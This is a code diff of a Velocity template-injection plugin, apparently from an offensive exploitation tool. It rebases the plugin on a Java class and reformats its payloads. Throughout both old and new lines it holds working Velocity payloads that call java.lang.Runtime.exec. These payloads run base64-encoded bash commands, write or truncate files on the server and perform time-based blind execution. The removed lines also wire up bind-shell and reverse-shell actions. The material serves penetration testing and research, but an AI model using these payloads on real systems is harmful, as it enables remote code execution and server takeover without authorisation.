@@ -1,20 +1,20 @@
 from utils.loggers import log
-from core.plugin import Plugin
+from plugins.languages import java
 from core import languages
 from utils import rand
 from utils.strings import quote
 import re
 
-class Velocity(Plugin):
+class Velocity(java.Java):
     
     def init(self):
 
         self.update_actions({
             'render' : {
-                'render': '#set($c=%(code)s)\n${c}\n',
+                'render': '%(code)s',
                 'header': '\n#set($h=%(header)s)\n${h}\n',
                 'trailer': '\n#set($t=%(trailer)s)\n${t}\n',
-                'render_test': '%(n1)s*%(n2)s' % { 
+                'render_test': '#set($c=%(n1)s*%(n2)s)\n${c}\n' % { 
                     'n1' : rand.randints[0], 
                     'n2' : rand.randints[1]
                 },
@@ -25,41 +25,33 @@ class Velocity(Plugin):
             'write' : {
                 'call' : 'inject',
                 'write' : """#set($engine="")
-    #set($run=$engine.getClass().forName("java.lang.Runtime"))
-    #set($runtime=$run.getRuntime())
-    #set($proc=$runtime.exec("bash -c {tr,_-,/+}<<<%(chunk_b64)s|{base64,--decode}>>%(path)s"))
-    #set($null=$proc.waitFor())
-    #set($istr=$proc.getInputStream())
-    #set($chr=$engine.getClass().forName("java.lang.Character"))
-    #set($output="")
-    #set($string=$engine.getClass().forName("java.lang.String"))
-    #foreach($i in [1..$istr.available()])
-    #set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))
-    #end
-    ${output}
-    """,
+#set($run=$engine.getClass().forName("java.lang.Runtime"))
+#set($runtime=$run.getRuntime())
+#set($proc=$runtime.exec("bash -c {tr,_-,/+}<<<%(chunk_b64)s|{base64,--decode}>>%(path)s"))
+#set($null=$proc.waitFor())
+#set($istr=$proc.getInputStream())
+#set($chr=$engine.getClass().forName("java.lang.Character"))
+#set($output="")
+#set($string=$engine.getClass().forName("java.lang.String"))
+#foreach($i in [1..$istr.available()])
+#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))
+#end
+${output}
+""",
                 'truncate' : """#set($engine="")
-    #set($run=$engine.getClass().forName("java.lang.Runtime"))
-    #set($runtime=$run.getRuntime())
-    #set($proc=$runtime.exec("bash -c {echo,-n,}>%(path)s"))
-    #set($null=$proc.waitFor())
-    #set($istr=$proc.getInputStream())
-    #set($chr=$engine.getClass().forName("java.lang.Character"))
-    #set($output="")
-    #set($string=$engine.getClass().forName("java.lang.String"))
-    #foreach($i in [1..$istr.available()])
-    #set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))
-    #end
-    ${output}
-    """
-            },
-            'read' : {
-                'call': 'execute',
-                'read' : """base64<'%(path)s'"""
-            },
-            'md5' : {
-                'call': 'execute',
-                'md5': """$(type -p md5 md5sum)<'%(path)s'|head -c 32"""
+#set($run=$engine.getClass().forName("java.lang.Runtime"))
+#set($runtime=$run.getRuntime())
+#set($proc=$runtime.exec("bash -c {echo,-n,}>%(path)s"))
+#set($null=$proc.waitFor())
+#set($istr=$proc.getInputStream())
+#set($chr=$engine.getClass().forName("java.lang.Character"))
+#set($output="")
+#set($string=$engine.getClass().forName("java.lang.String"))
+#foreach($i in [1..$istr.available()])
+#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))
+#end
+${output}
+"""
             },
             'execute' : {
 
@@ -68,49 +60,36 @@ class Velocity(Plugin):
 
                 'call': 'render',
                 'execute': """#set($engine="")
-    #set($run=$engine.getClass().forName("java.lang.Runtime"))
-    #set($runtime=$run.getRuntime())
-    #set($proc=$runtime.exec("bash -c {eval,$({tr,/+,_-}<<<%(code_b64)s|{base64,--decode})}"))
-    #set($null=$proc.waitFor())
-    #set($istr=$proc.getInputStream())
-    #set($chr=$engine.getClass().forName("java.lang.Character"))
-    #set($output="")
-    #set($string=$engine.getClass().forName("java.lang.String"))
-    #foreach($i in [1..$istr.available()])
-    #set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))
-    #end
-    ${output}
-    """ 
-            },
-            'blind' : {
-                'call': 'execute_blind',
-                'bool_true' : 'true',
-                'bool_false' : 'false'
+#set($run=$engine.getClass().forName("java.lang.Runtime"))
+#set($runtime=$run.getRuntime())
+#set($proc=$runtime.exec("bash -c {eval,$({tr,/+,_-}<<<%(code_b64)s|{base64,--decode})}"))
+#set($null=$proc.waitFor())
+#set($istr=$proc.getInputStream())
+#set($chr=$engine.getClass().forName("java.lang.Character"))
+#set($output="")
+#set($string=$engine.getClass().forName("java.lang.String"))
+#foreach($i in [1..$istr.available()])
+#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))
+#end
+${output}
+""" 
             },
             'execute_blind' : {
                 'call': 'inject',
                 'execute_blind': """#set($engine="")
-    #set($run=$engine.getClass().forName("java.lang.Runtime"))
-    #set($runtime=$run.getRuntime())
-    #set($proc=$runtime.exec("bash -c {eval,$({tr,/+,_-}<<<%(code_b64)s|{base64,--decode})}&&{sleep,%(delay)s}"))
-    #set($null=$proc.waitFor())
-    #set($istr=$proc.getInputStream())
-    #set($chr=$engine.getClass().forName("java.lang.Character"))
-    #set($output="")
-    #set($string=$engine.getClass().forName("java.lang.String"))
-    #foreach($i in [1..$istr.available()])
-    #set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))
-    #end
-    ${output}
-    """
-            },
-            'bind_shell' : {
-                'call' : 'execute_blind',
-                'bind_shell': languages.bash_bind_shell
-            },
-            'reverse_shell' : {
-                'call': 'execute_blind',
-                'reverse_shell' : languages.bash_reverse_shell
+#set($run=$engine.getClass().forName("java.lang.Runtime"))
+#set($runtime=$run.getRuntime())
+#set($proc=$runtime.exec("bash -c {eval,$({tr,/+,_-}<<<%(code_b64)s|{base64,--decode})}&&{sleep,%(delay)s}"))
+#set($null=$proc.waitFor())
+#set($istr=$proc.getInputStream())
+#set($chr=$engine.getClass().forName("java.lang.Character"))
+#set($output="")
+#set($string=$engine.getClass().forName("java.lang.String"))
+#foreach($i in [1..$istr.available()])
+#set($output=$output.concat($string.valueOf($chr.toChars($istr.read()))))
+#end
+${output}
+"""
             }
         })
 
@@ -130,7 +109,6 @@ class Velocity(Plugin):
 
         ])
 
-    language = 'java'
 
     def rendered_detected(self):
 
